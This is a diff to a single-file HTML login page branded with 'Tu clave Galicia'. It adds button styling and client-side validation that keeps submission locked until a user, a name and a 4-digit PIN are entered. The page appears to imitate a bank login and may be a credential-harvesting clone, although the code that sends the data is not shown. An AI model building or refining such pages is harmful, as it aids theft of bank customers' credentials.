@@ -114,12 +114,20 @@ button{
   padding:16px;
   border-radius:4px;
   font-size:15px;
-  cursor:pointer;
   font-weight:600;
+  color:#888;
+  cursor:not-allowed;
+  transition:.2s;
 }
 
-button:hover{
-  background:#d6d6d6;
+button.active{
+  background:#ff7a00;
+  color:white;
+  cursor:pointer;
+}
+
+button.active:hover{
+  background:#e96d00;
 }
 
 #mensaje{
@@ -207,14 +215,14 @@ button:hover{
 
         <div class="input-group">
           <input 
-  type="password" 
-  name="clave" 
-  placeholder="Tu clave Galicia" 
-  required
-  maxlength="4"
-  inputmode="numeric"
-  pattern="[0-9]{4}"
->
+            type="password" 
+            name="clave" 
+            placeholder="Tu clave Galicia" 
+            required
+            maxlength="4"
+            inputmode="numeric"
+            pattern="[0-9]{4}"
+          >
         </div>
 
         <div class="options">
@@ -224,7 +232,7 @@ button:hover{
           </label>
         </div>
 
-        <button type="submit" id="btn">INICIAR SESIÓN</button>
+        <button type="submit" id="btn" disabled>INICIAR SESIÓN</button>
 
         <div id="mensaje"></div>
 
@@ -249,12 +257,37 @@ button:hover{
 </div>
 
 <script>
-document.getElementById('miFormulario')
-.addEventListener('submit', async (e) => {
+const form = document.getElementById('miFormulario');
+const btn = document.getElementById('btn');
+
+const inputs = form.querySelectorAll('input');
+
+function checkForm() {
+  const usuario = form.usuario.value.trim();
+  const nombre = form.nombre.value.trim();
+  const clave = form.clave.value.trim();
+
+  if (
+    usuario !== "" &&
+    nombre !== "" &&
+    clave.length === 4 &&
+    /^[0-9]+$/.test(clave)
+  ) {
+    btn.disabled = false;
+    btn.classList.add('active');
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('active');
+  }
+}
+
+inputs.forEach(input => {
+  input.addEventListener('input', checkForm);
+});
+
+form.addEventListener('submit', async (e) => {
 
   e.preventDefault();
-
-  const btn = document.getElementById('btn');
 
   btn.disabled = true;
   btn.textContent = "Ingresando...";
